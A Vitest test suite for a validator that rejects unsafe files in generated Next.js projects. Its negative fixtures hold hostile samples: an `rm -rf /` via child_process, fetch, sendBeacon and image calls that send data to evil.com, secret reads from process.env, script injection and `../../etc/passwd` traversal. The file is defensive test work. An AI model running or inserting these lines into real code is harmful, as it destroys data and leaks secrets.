import { describe, expect, it } from 'vitest'
import {
	type FileInput,
	validateBuildFiles,
	validateFileImports,
	validateFilePath,
	validatePandaCss,
	validateStructure,
} from '../validate-files'

describe('validateFileImports', () => {
	it('rejects file importing unknown package', () => {
		const files: FileInput[] = [
			{
				path: 'src/components/Animate.tsx',
				content: `import { motion } from 'framer-motion'\nexport function Animate() { return <motion.div /> }`,
			},
		]
		const result = validateFileImports(files, new Set())
		expect(result.ok).toBe(false)
		if (!result.ok) {
			expect(result.errors).toHaveLength(1)
			expect(result.errors[0].path).toBe('src/components/Animate.tsx')
			expect(result.errors[0].message).toContain('framer-motion')
		}
	})

	it('rejects file importing relative path that does not exist', () => {
		const files: FileInput[] = [
			{
				path: 'src/components/Card.tsx',
				content: `import { helper } from './nonexistent'\nexport function Card() { return <div /> }`,
			},
		]
		const result = validateFileImports(files, new Set())
		expect(result.ok).toBe(false)
		if (!result.ok) {
			expect(result.errors[0].message).toContain('nonexistent')
		}
	})

	it('accepts file importing from allowed packages', () => {
		const files: FileInput[] = [
			{
				path: 'src/components/Page.tsx',
				content: `import { useState } from 'react'\nimport { Box } from 'styled-system/jsx'\nimport Link from 'next/link'\nexport default function Page() { return <Box><Link href="/">Home</Link></Box> }`,
			},
		]
		const result = validateFileImports(files, new Set())
		expect(result.ok).toBe(true)
	})

	it('accepts file importing relative path that exists in file set', () => {
		const files: FileInput[] = [
			{
				path: 'src/lib/utils.ts',
				content: `export function format(n: number) { return n.toString() }`,
			},
			{
				path: 'src/components/Display.tsx',
				content: `import { format } from '../lib/utils'\nexport function Display() { return <div>{format(42)}</div> }`,
			},
		]
		const result = validateFileImports(files, new Set())
		expect(result.ok).toBe(true)
	})

	it('accepts file importing from existing project paths', () => {
		const files: FileInput[] = [
			{
				path: 'src/components/Header.tsx',
				content: `import { Logo } from './Logo'\nexport function Header() { return <Logo /> }`,
			},
		]
		const existingPaths = new Set(['src/components/Logo.tsx'])
		const result = validateFileImports(files, existingPaths)
		expect(result.ok).toBe(true)
	})

	it('resolves @/ alias imports to src/', () => {
		const files: FileInput[] = [
			{
				path: 'app/page.tsx',
				content: `import { Button } from '@/components/Button'\nexport default function Page() { return <Button /> }`,
			},
		]
		const existingPaths = new Set(['src/components/Button.tsx'])
		const result = validateFileImports(files, existingPaths)
		expect(result.ok).toBe(true)
	})

	it('rejects @/ alias import when target does not exist', () => {
		const files: FileInput[] = [
			{
				path: 'app/page.tsx',
				content: `import { Ghost } from '@/components/Ghost'\nexport default function Page() { return <Ghost /> }`,
			},
		]
		const result = validateFileImports(files, new Set())
		expect(result.ok).toBe(false)
		if (!result.ok) {
			expect(result.errors[0].message).toContain('Ghost')
		}
	})

	it('skips non-TS/TSX files', () => {
		const files: FileInput[] = [
			{ path: 'app/globals.css', content: '@layer reset, base, tokens, recipes, utilities;' },
			{ path: 'public/data.json', content: '{"key": "value"}' },
		]
		const result = validateFileImports(files, new Set())
		expect(result.ok).toBe(true)
	})

	it('handles re-exports', () => {
		const files: FileInput[] = [
			{
				path: 'src/lib/math.ts',
				content: `export function add(a: number, b: number) { return a + b }`,
			},
			{
				path: 'src/lib/index.ts',
				content: `export { add } from './math'`,
			},
		]
		const result = validateFileImports(files, new Set())
		expect(result.ok).toBe(true)
	})

	it('allows next/* subpath imports', () => {
		const files: FileInput[] = [
			{
				path: 'app/page.tsx',
				content: `import { ImageResponse } from 'next/og'\nexport default function Page() { return <div /> }`,
			},
		]
		const result = validateFileImports(files, new Set())
		expect(result.ok).toBe(true)
	})

	it('rejects dynamic import() of forbidden packages', () => {
		const files: FileInput[] = [
			{
				path: 'src/components/Lazy.tsx',
				content: `export async function load() { const mod = await import('fs'); return mod; }`,
			},
		]
		const result = validateFileImports(files, new Set())
		expect(result.ok).toBe(false)
		if (!result.ok) {
			expect(result.errors[0].message).toContain('fs')
		}
	})

	it('rejects require() calls for forbidden packages', () => {
		const files: FileInput[] = [
			{
				path: 'src/lib/hack.ts',
				content: `const cp = require('child_process'); cp.exec('rm -rf /');`,
			},
		]
		const result = validateFileImports(files, new Set())
		expect(result.ok).toBe(false)
		if (!result.ok) {
			expect(result.errors[0].message).toContain('child_process')
		}
	})

	it('rejects template literal dynamic import of forbidden packages', () => {
		const files: FileInput[] = [
			{
				path: 'src/lib/sneak.ts',
				content: 'export async function sneak() { return import(`fs`); }',
			},
		]
		const result = validateFileImports(files, new Set())
		expect(result.ok).toBe(false)
		if (!result.ok) {
			expect(result.errors[0].message).toContain('fs')
		}
	})

	it('rejects next/dynamic import', () => {
		const files: FileInput[] = [
			{
				path: 'src/components/Lazy.tsx',
				content: `import dynamic from 'next/dynamic'\nconst Heavy = dynamic(() => import('./Heavy'))\nexport function Lazy() { return <Heavy /> }`,
			},
		]
		const result = validateFileImports(files, new Set())
		expect(result.ok).toBe(false)
		if (!result.ok) {
			expect(result.errors[0].message).toContain('next/dynamic')
		}
	})

	it('allows dynamic import() of project-relative paths', () => {
		const files: FileInput[] = [
			{
				path: 'src/components/Loader.tsx',
				content: `export async function load() { return import('./Heavy'); }`,
			},
			{
				path: 'src/components/Heavy.tsx',
				content: `export function Heavy() { return <div>big</div> }`,
			},
		]
		const result = validateFileImports(files, new Set())
		expect(result.ok).toBe(true)
	})
})

describe('validateFilePath', () => {
	it('allows app/page.tsx', () => {
		expect(validateFilePath('app/page.tsx').ok).toBe(true)
		expect(validateFilePath('src/app/page.tsx').ok).toBe(true)
	})

	it('allows nested app pages', () => {
		expect(validateFilePath('app/dashboard/page.tsx').ok).toBe(true)
		expect(validateFilePath('src/app/dashboard/page.tsx').ok).toBe(true)
		expect(validateFilePath('app/settings/profile/page.tsx').ok).toBe(true)
	})

	it('allows app layout files', () => {
		expect(validateFilePath('app/dashboard/layout.tsx').ok).toBe(true)
	})

	it('allows app loading/error/not-found files', () => {
		expect(validateFilePath('app/loading.tsx').ok).toBe(true)
		expect(validateFilePath('app/error.tsx').ok).toBe(true)
		expect(validateFilePath('app/not-found.tsx').ok).toBe(true)
	})

	it('allows all standard Next.js App Router conventions', () => {
		expect(validateFilePath('app/template.tsx').ok).toBe(true)
		expect(validateFilePath('app/default.tsx').ok).toBe(true)
		expect(validateFilePath('app/global-error.tsx').ok).toBe(true)
		expect(validateFilePath('app/sitemap.ts').ok).toBe(true)
		expect(validateFilePath('app/robots.ts').ok).toBe(true)
		expect(validateFilePath('app/manifest.ts').ok).toBe(true)
		expect(validateFilePath('src/app/dashboard/template.tsx').ok).toBe(true)
	})

	it('allows src components and lib', () => {
		expect(validateFilePath('src/components/Button.tsx').ok).toBe(true)
		expect(validateFilePath('src/lib/utils.ts').ok).toBe(true)
	})

	it('allows public static assets', () => {
		expect(validateFilePath('public/logo.png').ok).toBe(true)
		expect(validateFilePath('public/images/hero.jpg').ok).toBe(true)
	})

	it('allows app/globals.css', () => {
		expect(validateFilePath('app/globals.css').ok).toBe(true)
	})

	it('blocks app/api routes', () => {
		const result = validateFilePath('app/api/route.ts')
		expect(result.ok).toBe(false)
	})

	it('blocks nested api routes', () => {
		expect(validateFilePath('app/api/users/route.ts').ok).toBe(false)
		expect(validateFilePath('src/app/api/users/route.ts').ok).toBe(false)
	})

	it('blocks middleware.ts', () => {
		expect(validateFilePath('middleware.ts').ok).toBe(false)
	})

	it('blocks instrumentation.ts', () => {
		expect(validateFilePath('instrumentation.ts').ok).toBe(false)
	})

	it('blocks route.ts files anywhere', () => {
		expect(validateFilePath('app/dashboard/route.ts').ok).toBe(false)
	})

	it('blocks route.tsx files too', () => {
		expect(validateFilePath('app/dashboard/route.tsx').ok).toBe(false)
		expect(validateFilePath('route.tsx').ok).toBe(false)
	})

	it('blocks files outside allowed directories', () => {
		expect(validateFilePath('lib/something.ts').ok).toBe(false)
		expect(validateFilePath('utils/helper.ts').ok).toBe(false)
	})

	it('blocks path traversal via ../ segments', () => {
		expect(validateFilePath('src/../middleware.ts').ok).toBe(false)
		expect(validateFilePath('src/../app/api/steal/route.ts').ok).toBe(false)
		expect(validateFilePath('app/../middleware.ts').ok).toBe(false)
		expect(validateFilePath('public/../../etc/passwd').ok).toBe(false)
	})

	it('normalizes paths before checking', () => {
		expect(validateFilePath('src/./components/Button.tsx').ok).toBe(true)
		expect(validateFilePath('src/components/../lib/utils.ts').ok).toBe(true)
	})
})

describe('validateStructure', () => {
	it('rejects component with useState but no use client', () => {
		const files: FileInput[] = [
			{
				path: 'src/components/Counter.tsx',
				content: `import { useState } from 'react'\nexport function Counter() { const [c, setC] = useState(0); return <div>{c}</div> }`,
			},
		]
		const result = validateStructure(files)
		expect(result.ok).toBe(false)
		if (!result.ok) {
			expect(result.errors[0].rule).toBe('missing-use-client')
		}
	})

	it('accepts component with useState AND use client', () => {
		const files: FileInput[] = [
			{
				path: 'src/components/Counter.tsx',
				content: `'use client'\nimport { useState } from 'react'\nexport function Counter() { const [c, setC] = useState(0); return <div>{c}</div> }`,
			},
		]
		expect(validateStructure(files).ok).toBe(true)
	})

	it('accepts server component without hooks or directive', () => {
		const files: FileInput[] = [
			{
				path: 'src/components/Card.tsx',
				content: `import { Box } from 'styled-system/jsx'\nexport function Card() { return <Box>Hello</Box> }`,
			},
		]
		expect(validateStructure(files).ok).toBe(true)
	})

	it('rejects page.tsx without default export', () => {
		const files: FileInput[] = [
			{
				path: 'app/page.tsx',
				content: `import { Box } from 'styled-system/jsx'\nexport function Page() { return <Box>Hello</Box> }`,
			},
		]
		const result = validateStructure(files)
		expect(result.ok).toBe(false)
		if (!result.ok) {
			expect(result.errors[0].rule).toBe('missing-default-export')
		}
	})

	it('accepts page.tsx with default export', () => {
		const files: FileInput[] = [
			{
				path: 'app/page.tsx',
				content: `import { Box } from 'styled-system/jsx'\nexport default function Page() { return <Box>Hello</Box> }`,
			},
		]
		expect(validateStructure(files).ok).toBe(true)
	})

	it('rejects file containing eval(', () => {
		const files: FileInput[] = [
			{
				path: 'src/lib/run.ts',
				content: `export function run(code: string) { return eval(code) }`,
			},
		]
		const result = validateStructure(files)
		expect(result.ok).toBe(false)
		if (!result.ok) {
			expect(result.errors[0].rule).toBe('forbidden-pattern')
		}
	})

	it('rejects file containing "use server" directive', () => {
		const files: FileInput[] = [
			{
				path: 'src/actions/save.ts',
				content: `"use server"\nexport async function save() {}`,
			},
		]
		const result = validateStructure(files)
		expect(result.ok).toBe(false)
		if (!result.ok) {
			expect(result.errors[0].rule).toBe('forbidden-pattern')
		}
	})

	it('rejects file containing process.env', () => {
		const files: FileInput[] = [
			{
				path: 'src/lib/config.ts',
				content: `export const apiKey = process.env.SECRET_KEY`,
			},
		]
		const result = validateStructure(files)
		expect(result.ok).toBe(false)
		if (!result.ok) {
			expect(result.errors[0].rule).toBe('forbidden-pattern')
		}
	})

	it('rejects file containing fetch() call', () => {
		const files: FileInput[] = [
			{
				path: 'src/lib/api.ts',
				content: `export async function getData() { return fetch('https://evil.com/exfil') }`,
			},
		]
		const result = validateStructure(files)
		expect(result.ok).toBe(false)
		if (!result.ok) {
			expect(result.errors[0].rule).toBe('forbidden-pattern')
			expect(result.errors[0].message).toContain('fetch')
		}
	})

	it('rejects file containing dangerouslySetInnerHTML', () => {
		const files: FileInput[] = [
			{
				path: 'src/components/Raw.tsx',
				content: `export function Raw() { return <div dangerouslySetInnerHTML={{__html: '<script>alert(1)</script>'}} /> }`,
			},
		]
		const result = validateStructure(files)
		expect(result.ok).toBe(false)
		if (!result.ok) {
			expect(result.errors[0].rule).toBe('forbidden-pattern')
		}
	})

	it('rejects indented "use server" inside function body', () => {
		const files: FileInput[] = [
			{
				path: 'src/actions/inline.ts',
				content: `export async function save() {\n  "use server"\n  console.log('action')\n}`,
			},
		]
		const result = validateStructure(files)
		expect(result.ok).toBe(false)
		if (!result.ok) {
			expect(result.errors[0].rule).toBe('forbidden-pattern')
		}
	})

	it('rejects EventSource usage', () => {
		const files: FileInput[] = [
			{
				path: 'src/lib/stream.ts',
				content: `export function listen() { return new EventSource('https://evil.com/stream') }`,
			},
		]
		const result = validateStructure(files)
		expect(result.ok).toBe(false)
		if (!result.ok) {
			expect(result.errors[0].rule).toBe('forbidden-pattern')
		}
	})

	it('rejects navigator.sendBeacon()', () => {
		const files: FileInput[] = [
			{
				path: 'src/lib/beacon.ts',
				content: `export function exfil(data: string) { navigator.sendBeacon('https://evil.com', data) }`,
			},
		]
		const result = validateStructure(files)
		expect(result.ok).toBe(false)
		if (!result.ok) {
			expect(result.errors[0].rule).toBe('forbidden-pattern')
		}
	})

	it('rejects document.write', () => {
		const files: FileInput[] = [
			{
				path: 'src/lib/inject.ts',
				content: `export function inject() { document.write('<script>alert(1)</script>') }`,
			},
		]
		const result = validateStructure(files)
		expect(result.ok).toBe(false)
		if (!result.ok) {
			expect(result.errors[0].rule).toBe('forbidden-pattern')
		}
	})

	it('rejects external URLs in JSX src/href attributes', () => {
		const files: FileInput[] = [
			{
				path: 'src/components/Exfil.tsx',
				content: `export function Exfil() { return <img src="https://evil.com/exfil?data=stolen" /> }`,
			},
		]
		const result = validateStructure(files)
		expect(result.ok).toBe(false)
		if (!result.ok) {
			expect(result.errors[0].rule).toBe('forbidden-pattern')
			expect(result.errors[0].message).toContain('External URL')
		}
	})

	it('allows relative and root-relative URLs in JSX attributes', () => {
		const files: FileInput[] = [
			{
				path: 'src/components/Logo.tsx',
				content: `import Image from 'next/image'\nexport function Logo() { return <Image src="/logo.png" alt="logo" width={100} height={100} /> }`,
			},
		]
		expect(validateStructure(files).ok).toBe(true)
	})

	it('does not false-positive on hook names in comments', () => {
		const files: FileInput[] = [
			{
				path: 'src/components/Card.tsx',
				content: `import { Box } from 'styled-system/jsx'\n// This component does not useState or useEffect\nexport function Card() { return <Box>Static</Box> }`,
			},
		]
		expect(validateStructure(files).ok).toBe(true)
	})

	it('does not false-positive on hook names inside string literals', () => {
		const files: FileInput[] = [
			{
				path: 'src/components/Docs.tsx',
				content: `import { Box } from 'styled-system/jsx'\nexport function Docs() { return <Box>{"Call useState to manage state"}</Box> }`,
			},
		]
		expect(validateStructure(files).ok).toBe(true)
	})

	it('accepts client component with hooks that is not a page', () => {
		const files: FileInput[] = [
			{
				path: 'src/components/Toggle.tsx',
				content: `'use client'\nimport { useState } from 'react'\nexport function Toggle() { const [on, setOn] = useState(false); return <button onClick={() => setOn(!on)}>{on ? 'ON' : 'OFF'}</button> }`,
			},
		]
		expect(validateStructure(files).ok).toBe(true)
	})

	it('skips non-TS/TSX files for structural checks', () => {
		const files: FileInput[] = [{ path: 'app/globals.css', content: '@layer reset;' }]
		expect(validateStructure(files).ok).toBe(true)
	})
})

describe('validatePandaCss', () => {
	describe('color token allowlist', () => {
		it('rejects invalid color tokens in JSX props', () => {
			const files: FileInput[] = [
				{
					path: 'src/components/Card.tsx',
					content: `import { Box } from 'styled-system/jsx'\nexport function Card() { return <Box bg="blue.500">Hi</Box> }`,
				},
			]
			const result = validatePandaCss(files)
			expect(result.ok).toBe(false)
			if (!result.ok) {
				expect(result.errors[0].rule).toBe('invalid-token')
				expect(result.errors[0].message).toContain('blue.500')
			}
		})

		it('rejects invalid color tokens like sand.13', () => {
			const files: FileInput[] = [
				{
					path: 'src/components/Card.tsx',
					content: `import { Box } from 'styled-system/jsx'\nexport function Card() { return <Box color="sand.13">Hi</Box> }`,
				},
			]
			const result = validatePandaCss(files)
			expect(result.ok).toBe(false)
			if (!result.ok) {
				expect(result.errors[0].message).toContain('sand.13')
			}
		})

		it('accepts valid color tokens', () => {
			const files: FileInput[] = [
				{
					path: 'src/components/Card.tsx',
					content: `import { Box } from 'styled-system/jsx'\nexport function Card() { return <Box bg="bg.subtle" color="fg.default">Hi</Box> }`,
				},
			]
			expect(validatePandaCss(files).ok).toBe(true)
		})

		it('accepts valid sand palette tokens', () => {
			const files: FileInput[] = [
				{
					path: 'src/components/Card.tsx',
					content: `import { Box } from 'styled-system/jsx'\nexport function Card() { return <Box bg="sand.3" color="sand.12">Hi</Box> }`,
				},
			]
			expect(validatePandaCss(files).ok).toBe(true)
		})

		it('rejects invalid tokens in css() calls', () => {
			const files: FileInput[] = [
				{
					path: 'src/components/Button.tsx',
					content: `'use client'\nimport { css } from 'styled-system/css'\nexport function Button() { return <button className={css({ bg: 'purple.600', color: 'white' })}>Click</button> }`,
				},
			]
			const result = validatePandaCss(files)
			expect(result.ok).toBe(false)
			if (!result.ok) {
				expect(result.errors[0].message).toContain('purple.600')
			}
		})

		it('accepts raw CSS color functions (rgba, hsla, oklch, etc.)', () => {
			const files: FileInput[] = [
				{
					path: 'src/app/page.tsx',
					content: `import { Box } from 'styled-system/jsx'
export default function Page() {
  return (
    <Box bg="rgba(245, 245, 247, 0.8)" color="rgba(0,0,0,0.06)" borderColor="hsla(0, 0%, 100%, 0.5)">
      <Box background="oklch(0.5 0.2 240)" fill="rgb(255, 0, 0)" stroke="hsl(120, 100%, 50%)">Hi</Box>
    </Box>
  )
}`,
				},
			]
			expect(validatePandaCss(files).ok).toBe(true)
		})

		it('accepts CSS functions with decimals (calc, clamp, min, max, var, gradient)', () => {
			const files: FileInput[] = [
				{
					path: 'src/app/page.tsx',
					content: `import { Box } from 'styled-system/jsx'
export default function Page() {
  return (
    <Box bg="linear-gradient(0.5turn, red, blue)" color="var(--c-0.5)">
      <Box background="calc(100vh - 3.5rem)" fill="clamp(0.875rem, 2vw, 1.125rem)">Hi</Box>
    </Box>
  )
}`,
				},
			]
			expect(validatePandaCss(files).ok).toBe(true)
		})

		it('accepts numeric spacing values in color-like props context', () => {
			const files: FileInput[] = [
				{
					path: 'src/components/Card.tsx',
					content: `import { Box } from 'styled-system/jsx'\nexport function Card() { return <Box padding="4" gap="8">Hi</Box> }`,
				},
			]
			expect(validatePandaCss(files).ok).toBe(true)
		})
	})

	describe('textStyle value check', () => {
		it('rejects invalid textStyle values', () => {
			const files: FileInput[] = [
				{
					path: 'src/components/Title.tsx',
					content: `import { Box } from 'styled-system/jsx'\nexport function Title() { return <Box textStyle="heading.7">Hi</Box> }`,
				},
			]
			const result = validatePandaCss(files)
			expect(result.ok).toBe(false)
			if (!result.ok) {
				expect(result.errors[0].rule).toBe('invalid-text-style')
				expect(result.errors[0].message).toContain('heading.7')
			}
		})

		it('accepts valid textStyle values', () => {
			const files: FileInput[] = [
				{
					path: 'src/components/Title.tsx',
					content: `import { Box } from 'styled-system/jsx'\nexport function Title() { return <Box textStyle="primary.lg">Hi</Box> }`,
				},
			]
			expect(validatePandaCss(files).ok).toBe(true)
		})

		it('accepts legacy textStyle names', () => {
			const files: FileInput[] = [
				{
					path: 'src/components/Title.tsx',
					content: `import { Box } from 'styled-system/jsx'\nexport function Title() { return <Box textStyle="label.md">Hi</Box> }`,
				},
			]
			expect(validatePandaCss(files).ok).toBe(true)
		})
	})

	describe('shorthand prop enforcement', () => {
		it('rejects shorthand spacing props in JSX', () => {
			const files: FileInput[] = [
				{
					path: 'src/components/Card.tsx',
					content: `import { Box } from 'styled-system/jsx'\nexport function Card() { return <Box mb="4" px="6">Hi</Box> }`,
				},
			]
			const result = validatePandaCss(files)
			expect(result.ok).toBe(false)
			if (!result.ok) {
				expect(result.errors[0].rule).toBe('shorthand-prop')
				expect(result.errors.some((e) => e.message.includes('mb'))).toBe(true)
			}
		})

		it('rejects shorthand props in css() calls', () => {
			const files: FileInput[] = [
				{
					path: 'src/components/Button.tsx',
					content: `'use client'\nimport { css } from 'styled-system/css'\nexport function Button() { return <button className={css({ mt: '2', py: '3' })}>Go</button> }`,
				},
			]
			const result = validatePandaCss(files)
			expect(result.ok).toBe(false)
			if (!result.ok) {
				expect(result.errors.some((e) => e.message.includes('mt'))).toBe(true)
			}
		})

		it('does not flag TypeScript type annotations that look like shorthands', () => {
			const files: FileInput[] = [
				{
					path: 'src/components/Utils.tsx',
					content: `function layout(mx: number, my: number) { return mx + my }
type Spacing = { px: string; py: string }
const pt: HTMLElement | null = null
export default function U() { return <div>{String(pt)}</div> }`,
				},
			]
			expect(validatePandaCss(files).ok).toBe(true)
		})

		it('accepts logical property names', () => {
			const files: FileInput[] = [
				{
					path: 'src/components/Card.tsx',
					content: `import { Box } from 'styled-system/jsx'\nexport function Card() { return <Box marginBlockEnd="4" paddingInline="6">Hi</Box> }`,
				},
			]
			expect(validatePandaCss(files).ok).toBe(true)
		})

		it('accepts gap and padding which are not shorthands', () => {
			const files: FileInput[] = [
				{
					path: 'src/components/Card.tsx',
					content: `import { VStack } from 'styled-system/jsx'\nexport function Card() { return <VStack gap="4" padding="6">Hi</VStack> }`,
				},
			]
			expect(validatePandaCss(files).ok).toBe(true)
		})
	})

	it('skips non-TS/TSX files', () => {
		const files: FileInput[] = [
			{ path: 'app/globals.css', content: '@layer reset; .foo { bg: blue.500; }' },
		]
		expect(validatePandaCss(files).ok).toBe(true)
	})
})

describe('validateBuildFiles (composed)', () => {
	it('rejects empty file content', () => {
		const files: FileInput[] = [{ path: 'src/components/Empty.tsx', content: '' }]
		const result = validateBuildFiles(files, new Set())
		expect(result.ok).toBe(false)
		if (!result.ok) {
			expect(result.errors[0].rule).toBe('empty-file')
		}
	})

	it('rejects files with only whitespace', () => {
		const files: FileInput[] = [{ path: 'src/lib/blank.ts', content: '   \n\n  ' }]
		const result = validateBuildFiles(files, new Set())
		expect(result.ok).toBe(false)
		if (!result.ok) {
			expect(result.errors[0].rule).toBe('empty-file')
		}
	})

	it('aggregates errors from multiple validators', () => {
		const files: FileInput[] = [
			{
				path: 'app/api/route.ts',
				content: `import { x } from 'framer-motion'\nexport async function GET() { return eval('1') }`,
			},
		]
		const result = validateBuildFiles(files, new Set())
		expect(result.ok).toBe(false)
		if (!result.ok) {
			expect(result.errors.length).toBeGreaterThan(1)
		}
	})
})
